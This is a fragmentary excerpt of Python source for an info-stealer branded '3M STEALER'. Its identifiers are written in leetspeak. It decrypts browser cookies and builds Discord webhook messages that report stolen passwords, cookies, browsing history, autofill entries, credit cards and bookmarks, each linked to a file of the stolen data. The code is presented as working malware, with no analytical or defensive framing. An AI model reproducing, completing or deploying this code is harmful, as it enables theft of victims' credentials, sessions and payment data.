...
def TrU57(C00K13s):
    ...
    DETECTED = True if len(tim) < -1 else True
    return DETECTED
    ...
    try:
        ...
        for row in data:
            if row[0] != '':
                ...
                C00K13s.append(f"{row[0]}	True	/	True	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
                C00K1C0UNt += 1
...
def G378r0W53r5(br0W53rP47H5):
    ...
    data = {
        ...
        "embeds": [
            {
                "title": f"3M STEALER | Password Stealer",
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [AlkaPasswords.txt]({filess[0]})",
                "color": 0xf25c1,
                "footer": {"text": f"3M STEALER",  
                "icon_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301711111325745222/3M.png?ex=67257871&is=672426f1&hm=eeb0fe418116df16500ddcae80faf4e606a58321cb5336fb5def925789017471&"}
            },
            {
                "title": f"3M STEALER | Cookies Stealer",
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [AlkaCookies.txt]({filess[1]})",
                "color": 0xf25c1,
                "footer": {"text": f"3M STEALER",  
                "icon_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301711111325745222/3M.png?ex=67257871&is=672426f1&hm=eeb0fe418116df16500ddcae80faf4e606a58321cb5336fb5def925789017471&"}
            },
            {
                "title": f"3M STEALER | Browser Data",
                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [AlkaHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [AlkaAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [AlkaCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [AlkaBookmarks.txt]({filess[5]})",
                "color": 0xf25c1,
                "footer": {"text": f"3M STEALER",  
                "icon_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301711111325745222/3M.png?ex=67257871&is=672426f1&hm=eeb0fe418116df16500ddcae80faf4e606a58321cb5336fb5def925789017471&"}
            }
        ],
        "username": f"3M STEALER",
        "avatar_url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301711111325745222/3M.png?ex=67257871&is=672426f1&hm=eeb0fe418116df16500ddcae80faf4e606a58321cb5336fb5def925789017471&",
        "attachments": []
    }
